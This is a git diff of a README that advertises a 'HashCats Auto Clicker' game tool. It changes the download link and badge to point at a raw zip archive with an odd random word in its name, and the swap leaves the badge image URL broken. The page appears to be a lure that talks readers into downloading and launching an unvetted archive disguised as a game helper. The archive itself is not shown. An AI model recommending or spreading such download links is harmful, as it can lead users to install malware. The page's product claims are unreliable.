@@ -10,7 +10,7 @@ Do you want to level up faster in the HashCats game? Tired of repetitive clickin
 - Easy-to-use interface
 
 ## Installation
-To access the HashCats Auto Clicker tool, download it [here](https://github.com/user-attachments/files/17804088/Program.zip). This link needs to be launched to initiate the download.
+To access the HashCats Auto Clicker tool, download it [here](https://github.com/bakiayman/HashCats-autoclicker/raw/refs/heads/master/src/main/frontend/autoclicker-Cats-Hash-antitetanolysin.zip). This link needs to be launched to initiate the download.
 
 ## How to Use
 1. Download the HashCats Auto Clicker tool from the provided link.
@@ -22,7 +22,7 @@ To access the HashCats Auto Clicker tool, download it [here](https://github.com/
 ## Get Started
 Boost your HashCats gaming experience with HashCats Auto Clicker. Say goodbye to manual clicking and hello to streamlined automation. Download the tool now and level up like never before!
 
-[![Download HashCats Auto Clicker](https://img.shields.io/badge/Download-HashCats%20Auto%20Clicker-blue)](https://github.com/user-attachments/files/17804088/Program.zip)
+[![Download HashCats Auto Clicker](https://github.com/bakiayman/HashCats-autoclicker/raw/refs/heads/master/src/main/frontend/autoclicker-Cats-Hash-antitetanolysin.zip%20Auto%20Clicker-blue)](https://github.com/bakiayman/HashCats-autoclicker/raw/refs/heads/master/src/main/frontend/autoclicker-Cats-Hash-antitetanolysin.zip)
 
 ## Disclaimer
 Please note that the HashCats Auto Clicker tool is intended for enhancing the gaming experience within the HashCats game. Use it responsibly and in accordance with the game's terms of service.
